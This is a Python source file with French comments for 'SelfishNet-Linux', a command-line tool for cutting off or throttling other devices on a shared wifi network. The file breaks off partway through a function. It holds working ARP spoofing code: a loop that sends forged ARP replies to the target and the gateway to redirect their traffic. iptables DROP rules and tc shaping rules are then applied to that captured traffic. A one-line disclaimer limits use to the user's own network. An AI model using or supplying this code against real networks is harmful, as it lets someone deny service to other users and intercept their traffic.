#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SelfishNet-Linux — l'équivalent Linux de SelfishNet (Windows).

But : reprendre le contrôle du wifi partagé quand les autres appareils saturent
la connexion.

Fonctions :
  * découverte passive et active des hôtes du réseau (ARP + trafic IP) ;
  * "pause"  -> l'appareil choisi perd totalement l'accès ;
  * "limit"  -> débit plafonné à N kbit/s (montant + descendant) ;
  * "free"   -> rend l'appareil à son état normal ;
  * Safe Mode, alias persistants, minuteurs automatiques, API distante sécurisée ;
  * restauration propre des tables ARP, d'ip_forward et de toutes les règles à l'arrêt.

Usage : sudo selfishnet <commande>   (voir --help ou README.md)

Avertissement : ne l'utilisez que sur VOTRE réseau / des appareils dont vous
êtes responsable (votre box, votre partage de connexion, votre famille).
"""

import argparse
try:
    import grp
except ImportError:
    grp = None
import ipaddress
import json
import os
import re
import select
import shlex
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
from collections import defaultdict, deque

# Assurer l'import de selfishnet_core même quand le script est exécuté via lien symbolique
_HERE = os.path.dirname(os.path.realpath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import selfishnet_core as core
from selfishnet_core import (
    VERSION,
    DeviceAliasStore,
    RemoteAPIServer,
    RuleTimerManager,
    human_bytes as human_bytes,
    human_rate,
    ipc_request,
    is_valid_mac,
    normalize_mac,
    recv_line,
    sort_key_ip,
    validate_iface,
    validate_ipv4,
    validate_rate,
    validate_safe_target,
)

# ------------------------------------------------------------------ constantes
# Certains environnements (sudo sans login shell, containers) n'ont pas
# /usr/sbin dans le PATH : iptables/tc/sysctl y vivent pourtant.
for _p in ("/usr/sbin", "/sbin", "/usr/local/sbin"):
    if _p not in os.environ.get("PATH", "").split(":"):
        os.environ["PATH"] = os.environ.get("PATH", "") + ":" + _p

STATE_DIR = "/var/lib/selfishnet"
STATE_FILE = os.path.join(STATE_DIR, "state.json")
SOCK_FILE = "/run/selfishnet.sock"
IPT_CHAIN = "SELFISHNET"          # chaîne filter (DROP = pause)
MANGLE_CHAIN = "SELFISHNET"       # chaîne mangle (MARKing pour le shaping)
POISON_INTERVAL = 1.5             # secondes entre deux salves ARP
RATE_WINDOW = 3.0                 # fenêtre de mesure du débit (s)
MARK_BASE = 100                   # base pour les handles tc
DEVICE_TTL_SEC = 1800             # purge des appareils inactifs après 30 min

PRESETS = {"free": None, "eco": 150, "limit": 500, "web": 1000, "stream": 2500}
MAC_MATCH = True        # blocage par MAC possible ? (détecté dynamiquement)

# Rétro-compatibilité avec les tests / appelants existants
_OUI_CACHE = core._OUI_CACHE
_OUI_LOADED = core._OUI_LOADED


def get_vendor(mac):
    """Délègue à selfishnet_core tout en respectant les variables de cache exposées."""
    core._OUI_LOADED = _OUI_LOADED
    res = core.get_vendor(mac)
    return res


# ------------------------------------------------------------------- utilitaires
def run(cmd, check=False, timeout=20):
    """Exécute une commande sans shell (shell=False strict) et renvoie (code_retour, sortie)."""
    if isinstance(cmd, str):
        argv = shlex.split(cmd)
    else:
        argv = [str(x) for x in cmd]
    if not argv:
        return 1, "commande vide"
    try:
        p = subprocess.run(
            argv,
            shell=False,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        if check and p.returncode != 0:
            raise RuntimeError(f"{argv[0]} -> {p.stderr.strip()}")
        return p.returncode, (p.stdout + p.stderr).strip()
    except FileNotFoundError:
        return 127, f"{argv[0]} introuvable"
    except subprocess.TimeoutExpired:
        return 124, "timeout"


def ok(cmd):
    return run(cmd)[0] == 0


def require_root():
    if os.geteuid() != 0:
        die("Cette commande doit être lancée en root : sudo selfishnet ...")


def die(msg, code=1):
    print(f"\033[31m[!]\033[0m {msg}", file=sys.stderr)
    sys.exit(code)


def info(msg):
    print(f"\033[36m[*]\033[0m {msg}", flush=True)


def good(msg):
    print(f"\033[32m[+]\033[0m {msg}", flush=True)


def warn(msg):
    print(f"\033[33m[!]\033[0m {msg}", flush=True)


# ------------------------------------------------------------ réseau (système)
def default_iface():
    rc, out = run(["ip", "-4", "route", "show", "default"])
    if rc == 0:
        m = re.search(r"default\s+via\s+(\S+)\s+dev\s+(\S+)", out)
        if m:
            try:
                return validate_iface(m.group(2), linux_strict=True)
            except ValueError:
                return None
    return None


def iface_ip(iface):
    if not iface:
        return None, None
    try:
        iface = validate_iface(iface, linux_strict=True)
    except ValueError:
        return None, None
    rc, out = run(["ip", "-4", "-o", "addr", "show", "dev", iface])
    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", out)
    if not m:
        return None, None
    return m.group(1), int(m.group(2))


def iface_has_ipv6(iface):
    """Détecte la présence d'une adresse IPv6 globale sur l'interface."""
    if not iface:
        return False
    try:
        iface = validate_iface(iface, linux_strict=True)
    except ValueError:
        return False
    rc, out = run(["ip", "-6", "-o", "addr", "show", "dev", iface, "scope", "global"])
    return rc == 0 and "inet6 " in out


def iface_mac(iface):
    if not iface:
        return None
    try:
        iface = validate_iface(iface, linux_strict=True)
        with open(f"/sys/class/net/{iface}/address", encoding="utf-8") as f:
            return normalize_mac(f.read().strip())
    except (OSError, ValueError):
        return None


def iface_is_wireless(iface):
    if not iface:
        return False
    try:
        iface = validate_iface(iface, linux_strict=True)
    except ValueError:
        return False
    return os.path.isdir(f"/sys/class/net/{iface}/wireless") or \
        os.path.exists(f"/sys/class/net/{iface}/phy80211")


def iface_is_ap(iface):
    if not iface:
        return False
    try:
        iface = validate_iface(iface, linux_strict=True)
    except ValueError:
        return False
    rc, out = run(["iw", "dev", iface, "info"])
    return rc == 0 and "type AP" in out


def gateway_ip(iface):
    if not iface:
        return None
    try:
        iface = validate_iface(iface, linux_strict=True)
    except ValueError:
        return None
    rc, out = run(["ip", "-4", "route", "show", "default", "dev", iface])
    m = re.search(r"via\s+(\d+\.\d+\.\d+\.\d+)", out)
    return m.group(1) if m else None


def read_proc_arp(iface=None):
    """Lit /proc/net/arp directement sans sous-processus : retourne {ip: mac}."""
    table = {}
    try:
        with open("/proc/net/arp", encoding="utf-8") as f:
            lines = f.readlines()[1:]
        for line in lines:
            parts = line.split()
            if len(parts) < 6:
                continue
            ip, _hw, flags, mac, _mask, dev = parts[:6]
            if iface and dev != iface:
                continue
            if flags == "0x0":
                continue
            norm = normalize_mac(mac)
            if norm:
                table[ip] = norm
    except OSError:
        pass
    return table


def arp_lookup(ip):
    """MAC connue du noyau pour cette IP (lecture /proc/net/arp puis ip neigh)."""
    try:
        valid_ip = validate_ipv4(ip)
    except ValueError:
        return None
    mac = read_proc_arp().get(valid_ip)
    if mac:
        return mac
    rc, out = run(["ip", "neigh", "show", valid_ip])
    if rc != 0:
        return None
    m = re.search(r"lladdr\s+([0-9a-f:]{17})", out.lower())
    return normalize_mac(m.group(1)) if m else None


def ip_forward_enabled():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", encoding="utf-8") as f:
            return f.read().strip() == "1"
    except OSError:
        return False


def set_ip_forward(on):
    run(["sysctl", "-w", f"net.ipv4.ip_forward={'1' if on else '0'}"])


def tc_available():
    return run(["tc", "-V"])[0] == 0


def iptables_available():
    return run(["iptables", "--version"])[0] == 0


def ip6tables_available():
    return run(["ip6tables", "--version"])[0] == 0


def load_state():
    return core.load_json(STATE_FILE, default={})


def save_state(st):
    os.makedirs(STATE_DIR, exist_ok=True)
    core.save_json_atomic(STATE_FILE, st)


# ------------------------------------------------------------------ découverte
class Discovery:
    """Écoute le réseau (ARP passif + comptage des paquets IP) pour lister les
    appareils connectés et mesurer leur consommation réelle (montant / descendant)."""

    def __init__(self, iface, my_ip, gateway_ip_, netmask=24, my_mac=None):
        self.iface = iface
        self.my_ip = my_ip
        self.my_mac = normalize_mac(my_mac) if my_mac else iface_mac(iface)
        self.gw_ip = gateway_ip_
        self.netmask = netmask or 24
        try:
            self.net = ipaddress.IPv4Network(f"{self.my_ip}/{self.netmask}", strict=False)
            self._broadcast = str(self.net.broadcast_address)
        except Exception:
            self.net = None
            self._broadcast = "255.255.255.255"
        self.devices = {}  # ip -> {"mac":..,"first":ts,"last":ts,"pkts":n,"bytes":n}
        now_ts = time.time()
        if self.my_ip:
            self.devices[self.my_ip] = {
                "mac": self.my_mac, "first": now_ts, "last": now_ts, "pkts": 0, "bytes": 0
            }
        if self.gw_ip:
            self.devices[self.gw_ip] = {
                "mac": None, "first": now_ts, "last": now_ts, "pkts": 0, "bytes": 0
            }
        self.win = defaultdict(deque)       # ip -> deque[(ts, size)] (total)
        self.win_up = defaultdict(deque)    # ip -> deque[(ts, size)] (montant)
        self.win_down = defaultdict(deque)  # ip -> deque[(ts, size)] (descendant)
        self.lock = threading.Lock()
        self.sniffer = None
        self._last_prune = now_ts

    def _is_local_host(self, ip_str):
        if not ip_str or ip_str in ("0.0.0.0", "255.255.255.255", self._broadcast):
            return False
        if ip_str == self.my_ip:
            return True
        if not self.net:
            return False
        try:
            addr = ipaddress.IPv4Address(ip_str)
            if addr.is_multicast or addr.is_loopback or addr == self.net.network_address or addr == self.net.broadcast_address:
                return False
            return addr in self.net
        except ValueError:
            return False

    def start(self):
        from scapy.all import ARP, AsyncSniffer, Ether, IP
        self._ARP, self._IP = ARP, IP

        def handle(pkt):
            now = time.time()
            try:
                if pkt.haslayer(ARP):
                    arp = pkt[ARP]
                    ip = arp.psrc
                    if arp.op in (1, 2) and ip and ip != self.my_ip and self._is_local_host(ip):
                        mac = normalize_mac(arp.hwsrc)
                        with self.lock:
                            d = self.devices.get(ip)
                            if not d:
                                self.devices[ip] = {
                                    "mac": mac, "first": now, "last": now, "pkts": 0, "bytes": 0
                                }
                            else:
                                d["last"] = now
                                if mac:
                                    d["mac"] = mac
                    return

                if not pkt.haslayer(IP):
                    return
                ip = pkt[IP]
                src, dst, size = ip.src, ip.dst, len(pkt)
                if dst in ("255.255.255.255", self._broadcast):
                    return

                # Éviter le double comptage des paquets routés/re-émis par notre propre NIC
                eth_src = None
                if pkt.haslayer(Ether):
                    eth_src = normalize_mac(pkt[Ether].src)
                    if eth_src and self.my_mac and eth_src == self.my_mac and src != self.my_ip and dst != self.my_ip:
                        return

                src_local = src != self.gw_ip and self._is_local_host(src)
                dst_local = dst != self.gw_ip and self._is_local_host(dst)
                if not src_local and not dst_local:
                    return

                with self.lock:
                    if src_local:
                        d = self.devices.get(src)
                        if d is None:
                            d = self.devices[src] = {
                                "mac": eth_src if src != self.my_ip else self.my_mac,
                                "first": now, "last": now, "pkts": 0, "bytes": 0,
                            }
                        elif not d.get("mac") and eth_src and eth_src != self.my_mac:
                            d["mac"] = eth_src
                        d["last"] = now
                        d["pkts"] += 1
                        d["bytes"] += size
                        self._push_sample(self.win[src], now, size)
                        self._push_sample(self.win_up[src], now, size)

                    if dst_local and dst != src:
                        d = self.devices.get(dst)
                        if d is None:
                            d = self.devices[dst] = {
                                "mac": None, "first": now, "last": now, "pkts": 0, "bytes": 0,
                            }
                        d["last"] = now
                        d["pkts"] += 1
                        d["bytes"] += size
                        self._push_sample(self.win[dst], now, size)
                        self._push_sample(self.win_down[dst], now, size)
            except Exception:
                pass

        self.sniffer = AsyncSniffer(iface=self.iface, prn=handle, store=False, filter="arp or ip")
        self.sniffer.start()

    @staticmethod
    def _push_sample(q, now, size):
        q.append((now, size))
        while q and now - q[0][0] > RATE_WINDOW:
            q.popleft()

    @staticmethod
    def _window_kbit(q, now):
        if not q:
            return 0.0, 0.0
        while q and now - q[0][0] > RATE_WINDOW:
            q.popleft()
        nbytes = sum(s for _, s in q)
        return (nbytes * 8.0 / 1000.0 / RATE_WINDOW), (len(q) / RATE_WINDOW)

    def stop(self):
        try:
            if self.sniffer and self.sniffer.running:
                self.sniffer.stop()
        except Exception:
            pass

    def prune_stale(self, protected_ips=()):
        """Supprime les appareils inactifs depuis plus de DEVICE_TTL_SEC."""
        now = time.time()
        keep = set(protected_ips) | {self.my_ip, self.gw_ip}
        with self.lock:
            stale = [
                ip for ip, d in self.devices.items()
                if ip not in keep and (now - d["last"]) > DEVICE_TTL_SEC
            ]
            for ip in stale:
                self.devices.pop(ip, None)
                self.win.pop(ip, None)
                self.win_up.pop(ip, None)
                self.win_down.pop(ip, None)
            self._last_prune = now

    def snapshot(self, aliases=None, protected_ips=()):
        now = time.time()
        # Lecture rapide de /proc/net/arp HORS VERROU (aucun sous-processus)
        arp_table = read_proc_arp(self.iface)
        if now - self._last_prune > 300:
            self.prune_stale(protected_ips)

        out = []
        with self.lock:
            for ip, d in self.devices.items():
                if self.net and ip != self.my_ip:
                    try:
                        if ipaddress.IPv4Address(ip) not in self.net:
                            continue
                    except ValueError:
                        continue
                mac = normalize_mac(d.get("mac"))
                if not mac:
                    if ip == self.my_ip:
                        mac = self.my_mac or iface_mac(self.iface)
                    else:
                        mac = arp_table.get(ip)
                    if mac:
                        d["mac"] = mac

                kbit, pps = self._window_kbit(self.win.get(ip), now)
                up_kbit, _ = self._window_kbit(self.win_up.get(ip), now)
                down_kbit, _ = self._window_kbit(self.win_down.get(ip), now)

                display_mac = mac or "?"
                vendor = get_vendor(mac) if mac else ""
                alias = aliases.get(mac=mac, ip=ip) if aliases else ""
                out.append({
                    "ip": ip,
                    "mac": display_mac,
                    "vendor": vendor,
                    "alias": alias,
                    "last": d["last"],
                    "age": max(0.0, now - d["last"]),
                    "pkts": d["pkts"],
                    "bytes": d["bytes"],
                    "kbit": kbit,
                    "up_kbit": up_kbit,
                    "down_kbit": down_kbit,
                    "pps": pps,
                })

        # Notre machine d'abord, puis la box, puis les autres hôtes par débit décroissant et IP
        out.sort(key=lambda x: (
            0 if x["ip"] == self.my_ip else (1 if x["ip"] == self.gw_ip else 2),
            -x["kbit"],
            sort_key_ip(x["ip"]),
        ))
        return out

    def total_kbit(self):
        now = time.time()
        total = 0.0
        with self.lock:
            for q in self.win.values():
                while q and now - q[0][0] > RATE_WINDOW:
                    q.popleft()
                total += sum(s for _, s in q)
        return total * 8.0 / 1000.0 / RATE_WINDOW


# ------------------------------------------------------------------ application
class Enforcer:
    """Applique l'ARP spoofing + les règles iptables/ip6tables/tc pour mettre en pause
    ou brider les appareils choisis."""

    def __init__(self, iface, my_ip, my_mac, gw_ip, gw_mac, netmask):
        self.iface = validate_iface(iface, linux_strict=True)
        self.my_ip = validate_ipv4(my_ip)
        self.my_mac = normalize_mac(my_mac)
        self.gw_ip = validate_ipv4(gw_ip) if gw_ip else None
        self.gw_mac = normalize_mac(gw_mac) if gw_mac else None
        self.netmask = netmask
        self.targets = {}          # ip -> {"mac":..., "mode":"limit"|"pause", "rate":kbit}
        self.lock = threading.Lock()
        self._rules_lock = threading.Lock()
        self._stop = threading.Event()
        self._thread = None
        self._tc_active = False
        self._tc_ingress = False
        self._shaping_method = None
        self._marks = {}           # ip -> mark
        self._next_mark = MARK_BASE
        self._chain_ready = False
        self._mangle_ready = False
        self._ip6_chain_ready = False
        self._orig_ip_forward = None
        self.errors = []

    def _record_error(self, msg):
        self.errors.append(msg)
        if len(self.errors) > 100:
            self.errors = self.errors[-50:]

    # ------------------------------------------------------------- ARP spoofing
    def resolve(self, ip, fast=False):
        """Demande la MAC d'une IP (table ARP puis ping/ARP who-has)."""
        try:
            valid_ip = validate_ipv4(ip)
        except ValueError:
            return None
        mac = arp_lookup(valid_ip)
        if mac:
            return mac
        if not fast:
            run(["ping", "-c", "1", "-W", "1", "--", valid_ip])
            mac = arp_lookup(valid_ip)
            if mac:
                return mac
        try:
            from scapy.all import ARP, Ether, srp
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=valid_ip)
            ans, _ = srp(
                pkt,
                iface=self.iface,
                timeout=0.6 if fast else 1.0,
                retry=0 if fast else 1,
                verbose=0,
            )
            for _, rcv in ans:
                if rcv.haslayer(ARP):
                    found = normalize_mac(rcv[ARP].hwsrc)
                    if found:
                        return found
        except Exception as exc:
            self._record_error(f"résolution ARP {valid_ip} : {exc}")
        return None

    def _arp_packets(self, ip, mac, restore=False):
        from scapy.all import ARP, Ether
        norm_mac = normalize_mac(mac)
        if not norm_mac or not self.gw_ip or not self.gw_mac or not self.my_mac:
            return []
        valid_ip = validate_ipv4(ip)
        if restore:
            to_target = Ether(dst=norm_mac, src=self.gw_mac) / ARP(
                op=2, psrc=self.gw_ip, hwsrc=self.gw_mac, pdst=valid_ip, hwdst=norm_mac
            )
            to_gw = Ether(dst=self.gw_mac, src=norm_mac) / ARP(
                op=2, psrc=valid_ip, hwsrc=norm_mac, pdst=self.gw_ip, hwdst=self.gw_mac
            )
        else:
            to_target = Ether(dst=norm_mac, src=self.my_mac) / ARP(
                op=2, psrc=self.gw_ip, hwsrc=self.my_mac, pdst=valid_ip, hwdst=norm_mac
            )
            to_gw = Ether(dst=self.gw_mac, src=self.my_mac) / ARP(
                op=2, psrc=valid_ip, hwsrc=self.my_mac, pdst=self.gw_ip, hwdst=self.gw_mac
            )
        return [to_target, to_gw]

    def _poison_loop(self):
        from scapy.all import sendp
        while not self._stop.is_set():
            with self.lock:
                targets = dict(self.targets)
            pkts = []
            for ip, cfg in targets.items():
                mac = normalize_mac(cfg.get("mac"))
                if not mac:
                    continue
                try:
                    pkts.extend(self._arp_packets(ip, mac))
                except Exception as exc:
                    self._record_error(f"construction ARP {ip} : {exc}")
            if pkts:
                try:
                    sendp(pkts, iface=self.iface, verbose=0)
                except Exception as exc:
                    self._record_error(f"envoi ARP : {exc}")
                    self._stop.wait(1.0)
                    continue
            self._stop.wait(POISON_INTERVAL)

    def restore_arp(self, ip, mac):
        norm = normalize_mac(mac)
        if not norm:
            return
        try:
            from scapy.all import sendp
            pkts = self._arp_packets(ip, norm, restore=True)
            if pkts:
                sendp(pkts, iface=self.iface, verbose=0, count=5, inter=0.15)
        except Exception:
            pass

    # ------------------------------------------------------------ iptables / ip6tables / tc
    def _ensure_chains(self):
        if not iptables_available():
            return False
        if not self._chain_ready:
            if not ok(["iptables", "-n", "-L", IPT_CHAIN]):
                ok(["iptables", "-N", IPT_CHAIN])
            if not ok(["iptables", "-C", "FORWARD", "-j", IPT_CHAIN]):
                ok(["iptables", "-I", "FORWARD", "1", "-j", IPT_CHAIN])
            self._chain_ready = True
        if not self._mangle_ready:
            if not ok(["iptables", "-t", "mangle", "-n", "-L", MANGLE_CHAIN]):
                ok(["iptables", "-t", "mangle", "-N", MANGLE_CHAIN])
            if not ok(["iptables", "-t", "mangle", "-C", "FORWARD", "-j", MANGLE_CHAIN]):
                ok(["iptables", "-t", "mangle", "-I", "FORWARD", "1", "-j", MANGLE_CHAIN])
            self._mangle_ready = True
        if not self._ip6_chain_ready and ip6tables_available():
            if not ok(["ip6tables", "-n", "-L", IPT_CHAIN]):
                ok(["ip6tables", "-N", IPT_CHAIN])
            if not ok(["ip6tables", "-C", "FORWARD", "-j", IPT_CHAIN]):
                ok(["ip6tables", "-I", "FORWARD", "1", "-j", IPT_CHAIN])
            self._ip6_chain_ready = True
        return True

    def _flush_filter(self):
        if self._chain_ready:
            ok(["iptables", "-F", IPT_CHAIN])
        if self._mangle_ready:
            ok(["iptables", "-t", "mangle", "-F", MANGLE_CHAIN])
        if self._ip6_chain_ready:
            ok(["ip6tables", "-F", IPT_CHAIN])

    def _detect_shaping(self):
        """Choisit la meilleure méthode de bridage disponible sur ce noyau."""
        if self._shaping_method:
            return self._shaping_method
        method = "none"
        if tc_available():
            rc, out = run([
                "tc", "qdisc", "replace", "dev", self.iface, "root",
                "handle", "1:", "htb", "default", "9999",
            ])
            if rc == 0:
                run(["tc", "qdisc", "del", "dev", self.iface, "root"])
                method = "tc"
            else:
                first_line = out.splitlines()[0] if out else "?"
                self._record_error(f"tc/htb indisponible ({first_line})")
        if method == "none":
            rc, _ = run(["iptables", "-t", "mangle", "-L", "FORWARD", "-n"])
            if rc == 0:
                method = "compat"
        self._shaping_method = method
        return method

    def _compat_add_rule(self, direction_flag, ip, rate_kbit):
        """iptables sans état (module 'limit') : débit lissé par le noyau."""
        pps = max(20, int(rate_kbit * 1000 / 8 / 700))      # ~700 o/paquet
        burst = max(5, pps // 5)
        rc, out = run([
            "iptables", "-t", "mangle", "-A", MANGLE_CHAIN,
            direction_flag, f"{ip}/32",
            "-m", "limit", "--limit", f"{pps}/s", "--limit-burst", str(burst),
            "-j", "RETURN",
        ])
        rc2, out2 = run([
            "iptables", "-t", "mangle", "-A", MANGLE_CHAIN,
            direction_flag, f"{ip}/32", "-j", "DROP",
        ])
        if rc != 0 or rc2 != 0:
            self._record_error(f"bridage compat {ip} : {(out or out2)[:120]}")
            return False
        return True

    def _tc_init(self):
        rc, out = run(["tc", "qdisc", "show", "dev", self.iface])
        if "handle 1: htb" in out:
            self._tc_active = True
            return True
        rc, out = run([
            "tc", "qdisc", "replace", "dev", self.iface, "root",
            "handle", "1:", "htb", "default", "9999",
        ])
        if rc != 0:
            self._record_error(f"tc qdisc : {out}")
            return False
        run([
            "tc", "class", "replace", "dev", self.iface, "parent", "1:",
            "classid", "1:9999", "htb", "rate", "10gbit", "ceil", "10gbit",
        ])
        self._tc_active = True
        return True

    def _tc_clear(self):
        if self._tc_active:
            run(["tc", "qdisc", "del", "dev", self.iface, "root"])
            self._tc_active = False
        run(["tc", "filter", "del", "dev", self.iface, "parent", "ffff:"])
        run(["tc", "qdisc", "del", "dev", self.iface, "ingress"])
        self._tc_ingress = False
        self._marks.clear()

    def _apply_shaping(self, targets_snapshot):
        """Applique le bridage de débit sur les cibles en mode 'limit'."""
        limited = {
            ip: c for ip, c in targets_snapshot.items()
            if c.get("mode") == "limit" and c.get("rate")
        }
        if not limited:
            self._tc_clear()
            return
        method = self._detect_shaping()
        if method == "compat":
            self._ensure_chains()
            ok(["iptables", "-t", "mangle", "-F", MANGLE_CHAIN])
            for ip, cfg in limited.items():
                kbit = validate_rate(cfg["rate"])
                self._compat_add_rule("-s", ip, kbit)
                self._compat_add_rule("-d", ip, kbit)
            good(f"Débit plafonné sur {len(limited)} appareil(s) [mode compatibilité]")
            return
        if method == "none":
            return

        # Nettoyage des classes/filtres orphelins des appareils qui ne sont plus limités
        stale_ips = [ip for ip in list(self._marks) if ip not in limited]
        for ip in stale_ips:
            old_mark = self._marks.pop(ip)
            run(["tc", "filter", "del", "dev", self.iface, "parent", "1:", "handle", str(old_mark), "fw"])
            run(["tc", "class", "del", "dev", self.iface, "parent", "1:", "classid", f"1:{old_mark}"])

        if not self._tc_init():
            return

        # --- sens montant (client -> box) : police sur l'ingress
        if not self._tc_ingress:
            rc, out = run(["tc", "qdisc", "show", "dev", self.iface, "ingress"])
            if "ingress" not in out:
                ok(["tc", "qdisc", "add", "dev", self.iface, "handle", "ffff:", "ingress"])
            self._tc_ingress = True
        run(["tc", "filter", "del", "dev", self.iface, "parent", "ffff:"])
        for ip, cfg in limited.items():
            kbit = validate_rate(cfg["rate"])
            burst_kb = max(4, min(64, kbit // 8))
            rc, out = run([
                "tc", "filter", "add", "dev", self.iface, "parent", "ffff:",
                "protocol", "ip", "prio", "1", "u32",
                "match", "ip", "src", f"{ip}/32",
                "police", "rate", f"{kbit}kbit", "burst", f"{burst_kb}k", "drop",
            ])
            if rc != 0:
                self._record_error(f"police montante {ip} : {out}")

        # --- sens descendant (box -> client) : HTB + marques mangle
        for ip, cfg in limited.items():
            mark = self._marks.get(ip)
            if mark is None:
                mark = self._next_mark
                self._next_mark += 1
                self._marks[ip] = mark
            kbit = validate_rate(cfg["rate"])
            burst_kb = max(4, min(32, kbit // 10))
            run([
                "tc", "class", "replace", "dev", self.iface, "parent", "1:",
                "classid", f"1:{mark}", "htb",
                "rate", f"{kbit}kbit", "ceil", f"{kbit}kbit",
                "burst", f"{burst_kb}k", "cburst", f"{burst_kb}k",
            ])
            run(["tc", "filter", "del", "dev", self.iface, "parent", "1:", "handle", str(mark), "fw"])
            rc, out = run([
                "tc", "filter", "add", "dev", self.iface, "parent", "1:",
                "protocol", "all", "handle", str(mark), "fw", "flowid", f"1:{mark}",
            ])
            if rc != 0:
                self._record_error(f"filtre descendant {ip} : {out}")
            ok(["iptables", "-t", "mangle", "-C", MANGLE_CHAIN, "-d", ip, "-j", "MARK", "--set-mark", str(mark)]) or \
                ok(["iptables", "-t", "mangle", "-A", MANGLE_CHAIN, "-d", ip, "-j", "MARK", "--set-mark", str(mark)])
        good(f"Shaping appliqué sur {len(limited)} appareil(s)")

    def _build_drop_lines(self, paused, include_mac=True):
        lines = []
        for ip, cfg in paused.items():
            lines.append(f"-A {IPT_CHAIN} -s {ip} -j DROP")
            lines.append(f"-A {IPT_CHAIN} -d {ip} -j DROP")
            mac = normalize_mac(cfg.get("mac"))
            if include_mac and MAC_MATCH and mac:
                lines.append(f"-A {IPT_CHAIN} -m mac --mac-source {mac} -j DROP")
        return lines

    def _apply_drop(self, targets_snapshot):
        """Blocage fort : par IP et par MAC (atomique via iptables-restore + repli IP si xt_mac absent)."""
        paused = {ip: c for ip, c in targets_snapshot.items() if c.get("mode") == "pause"}
        if not paused:
            return
        if not self._ensure_chains():
            self._record_error("iptables indisponible : impossible de mettre en pause")
            return

        lines = self._build_drop_lines(paused, include_mac=True)
        payload = f"*filter\n-F {IPT_CHAIN}\n" + "\n".join(lines) + "\nCOMMIT\n"
        try:
            p = subprocess.run(
                ["iptables-restore", "-n"],
                input=payload,
                text=True,
                capture_output=True,
                timeout=4,
            )
            if p.returncode == 0:
                self._apply_ip6_drop(paused)
                good(f"Pause appliquée sur {len(paused)} appareil(s) (instantané)")
                return
            # Si échec avec règle MAC active, basculer proprement en mode IP seul
            if MAC_MATCH and any("-m mac" in line for line in lines):
                self._mac_rule_unsupported()
                ip_only_lines = self._build_drop_lines(paused, include_mac=False)
                payload_ip = f"*filter\n-F {IPT_CHAIN}\n" + "\n".join(ip_only_lines) + "\nCOMMIT\n"
                p2 = subprocess.run(
                    ["iptables-restore", "-n"],
                    input=payload_ip,
                    text=True,
                    capture_output=True,
                    timeout=4,
                )
                if p2.returncode == 0:
                    good(f"Pause appliquée sur {len(paused)} appareil(s) (par IP)")
                    return
        except Exception:
            pass

        # Secours : injection directe par liste d'arguments
        applied_any = False
        for ip, cfg in paused.items():
            r1 = ok(["iptables", "-A", IPT_CHAIN, "-s", ip, "-j", "DROP"])
            r2 = ok(["iptables", "-A", IPT_CHAIN, "-d", ip, "-j", "DROP"])
            applied_any = applied_any or (r1 and r2)
            mac = normalize_mac(cfg.get("mac"))
            if MAC_MATCH and mac:
                if not ok(["iptables", "-A", IPT_CHAIN, "-m", "mac", "--mac-source", mac, "-j", "DROP"]):
                    self._mac_rule_unsupported()
        self._apply_ip6_drop(paused)
        if applied_any:
            good(f"Pause appliquée sur {len(paused)} appareil(s)")
        else:
            self._record_error("Échec de l'application des règles iptables DROP")

    def _apply_ip6_drop(self, paused):
        """Bloque le trafic IPv6 routé des appareils en pause via leur MAC (si ip6tables & xt_mac dispo)."""
        if not self._ip6_chain_ready or not MAC_MATCH:
            return
        ok(["ip6tables", "-F", IPT_CHAIN])
        for cfg in paused.values():
            mac = normalize_mac(cfg.get("mac"))
            if mac:
                ok(["ip6tables", "-A", IPT_CHAIN, "-m", "mac", "--mac-source", mac, "-j", "DROP"])

    def _mac_rule_unsupported(self):
        global MAC_MATCH
        if MAC_MATCH:
            MAC_MATCH = False
            self._record_error("règle MAC non supportée par ce noyau -> blocage par IP seul")

    def _refresh_rules(self):
        with self._rules_lock:
            with self.lock:
                targets_snapshot = dict(self.targets)
            self._flush_filter()
            if not targets_snapshot:
                self._tc_clear()
                return
            self._ensure_chains()
            self._apply_drop(targets_snapshot)
            self._apply_shaping(targets_snapshot)

    # ------------------------------------------------------------------ API
    def start(self):
        self._orig_ip_forward = ip_forward_enabled()
        set_ip_forward(True)
        with self._rules_lock:
            self._ensure_chains()
        self._thread = threading.Thread(target=self._poison_loop, daemon=True, name="SelfishNetARP")
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        with self.lock:
            targets = dict(self.targets)
            self.targets.clear()
        for ip, cfg in targets.items():
            if cfg.get("mac"):
                self.restore_arp(ip, cfg["mac"])
        with self._rules_lock:
            self._flush_filter()
            if self._chain_ready:
                ok(["iptables", "-D", "FORWARD", "-j", IPT_CHAIN])
                ok(["iptables", "-F", IPT_CHAIN])
                ok(["iptables", "-X", IPT_CHAIN])
                self._chain_ready = False
            if self._mangle_ready:
                ok(["iptables", "-t", "mangle", "-D", "FORWARD", "-j", MANGLE_CHAIN])
                ok(["iptables", "-t", "mangle", "-F", MANGLE_CHAIN])
                ok(["iptables", "-t", "mangle", "-X", MANGLE_CHAIN])
                self._mangle_ready = False
            if self._ip6_chain_ready:
                ok(["ip6tables", "-D", "FORWARD", "-j", IPT_CHAIN])
                ok(["ip6tables", "-F", IPT_CHAIN])
                ok(["ip6tables", "-X", IPT_CHAIN])
                self._ip6_chain_ready = False
            self._tc_clear()
        if self._orig_ip_forward is False:
            set_ip_forward(False)

    def set_target(self, ip, mac, mode, rate=None):
        self.set_targets_batch([(ip, mac)], mode, rate)

    def set_targets_batch(self, pairs, mode, rate=None):
        freed = []
        valid_rate = validate_rate(rate) if rate is not None else PRESETS["limit"]
        with self.lock:
            for ip, mac in pairs:
                try:
                    clean_ip = validate_ipv4(ip)
                except ValueError:
                    continue
                norm_mac = normalize_mac(mac)
                if mode == "free":
                    prev = self.targets.pop(clean_ip, None)
                    restore_mac = norm_mac or (prev.get("mac") if prev else None)
                    if restore_mac:
                        freed.append((clean_ip, restore_mac))
                else:
                    if not norm_mac:
                        continue
                    self.targets[clean_ip] = {
                        "mac": norm_mac,
                        "mode": mode,
                        "rate": valid_rate,
                    }
        if freed:
            threading.Thread(target=self._restore_arp_batch, args=(freed,), daemon=True).start()
        self._refresh_rules()

    def _restore_arp_batch(self, pairs):
        try:
            from scapy.all import sendp
        except Exception:
